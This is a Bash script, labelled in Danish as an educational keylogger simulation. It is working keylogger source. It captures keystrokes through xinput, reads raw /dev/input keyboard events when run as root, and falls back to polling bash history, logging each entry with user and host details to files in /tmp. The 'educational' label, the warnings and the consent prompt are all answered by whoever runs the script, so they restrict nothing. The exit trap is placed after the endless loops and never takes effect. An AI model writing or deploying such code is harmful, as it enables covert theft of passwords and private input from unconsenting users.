#!/bin/bash
# Simpel keylogger simulation (UDELUKKENDE TIL UDDANNELSE)

LOG_FILE="/tmp/keylog_$(date +%Y%m%d_%H%M%S).txt"
DISPLAY_LOG="/tmp/keylog_display.txt"

echo "=== Educational Keylogger Simulation ==="
echo ""
echo "⚠️  ADVARSEL: Dette er KUN til uddannelsesformål!"
echo "⚠️  Brug af keyloggers uden samtykke er ULOVLIGT!"
echo ""
echo "Logger til: $LOG_FILE"
echo ""

read -p "Bekræft at dette er til lovlig test (y/n): " confirm
if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
    echo "Afbrudt."
    exit 0
fi

# Tjek om vi har nødvendige rettigheder
if [ "$EUID" -ne 0 ]; then
    echo ""
    echo "⚠️  Dette script kræver root rettigheder for fuld funktionalitet"
    echo "Kører i begrænset mode..."
    echo ""
fi

# Init log
{
    echo "=== Keylogger Session ==="
    echo "Started: $(date)"
    echo "User: $(whoami)"
    echo "Host: $(hostname)"
    echo ""
} > "$LOG_FILE"

echo "Keylogger startet. Tryk Ctrl+C for at stoppe."
echo ""

# Metode 1: Brug xinput (kræver X11)
if command -v xinput &> /dev/null && [ -n "$DISPLAY" ]; then
    echo "Metode: xinput (X11)"
    echo ""
    
    # Find keyboard device
    keyboard_id=$(xinput list | grep -i keyboard | grep -v Virtual | head -1 | grep -oP 'id=\K\d+')
    
    if [ -n "$keyboard_id" ]; then
        echo "Keyboard device ID: $keyboard_id"
        echo "Logging tastetryk..."
        echo ""
        
        # Log keystrokes
        xinput test "$keyboard_id" | while read -r line; do
            timestamp=$(date '+%Y-%m-%d %H:%M:%S')
            echo "$timestamp | $line" >> "$LOG_FILE"
            echo "$line" >> "$DISPLAY_LOG"
            
            # Real-time display (valgfrit)
            if [[ "$line" =~ "key press" ]]; then
                keycode=$(echo "$line" | awk '{print $NF}')
                echo -ne "\rKey pressed: $keycode  "
            fi
        done
    else
        echo "Kunne ikke finde keyboard device"
    fi

# Metode 2: Monitor input events (kræver root)
elif [ -d "/dev/input" ] && [ "$EUID" -eq 0 ]; then
    echo "Metode: /dev/input (raw events)"
    echo ""
    
    # Find keyboard event device
    for device in /dev/input/event*; do
        device_name=$(cat /sys/class/input/$(basename "$device")/device/name 2>/dev/null)
        
        if [[ "$device_name" =~ [Kk]eyboard ]]; then
            echo "Keyboard fundet: $device ($device_name)"
            echo ""
            
            # Monitor events
            cat "$device" | od -An -t x1 | while read -r hex; do
                timestamp=$(date '+%Y-%m-%d %H:%M:%S')
                echo "$timestamp | $hex" >> "$LOG_FILE"
            done
            
            break
        fi
    done

# Metode 3: Log fra bash history (simpel)
else
    echo "Metode: Bash history monitoring (begrænset)"
    echo ""
    echo "Overvåger shell kommandoer..."
    echo ""
    
    # Monitor bash history
    HISTFILE_USER="$HOME/.bash_history"
    
    if [ -f "$HISTFILE_USER" ]; then
        # Gem initial state
        initial_lines=$(wc -l < "$HISTFILE_USER")
        
        while true; do
            current_lines=$(wc -l < "$HISTFILE_USER")
            
            if [ $current_lines -gt $initial_lines ]; then
                # Ny kommando detekteret
                new_cmds=$((current_lines - initial_lines))
                
                tail -n "$new_cmds" "$HISTFILE_USER" | while read -r cmd; do
                    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
                    echo "$timestamp | COMMAND: $cmd" >> "$LOG_FILE"
                    echo "Ny kommando: $cmd"
                done
                
                initial_lines=$current_lines
            fi
            
            sleep 1
        done
    fi
fi

# Cleanup på exit
trap 'echo ""; echo ""; echo "Keylogger stoppet."; echo "Log gemt til: $LOG_FILE"; echo ""; echo "⚠️  HUSK: Slet loggen når du er færdig!"; exit 0' SIGINT SIGTERM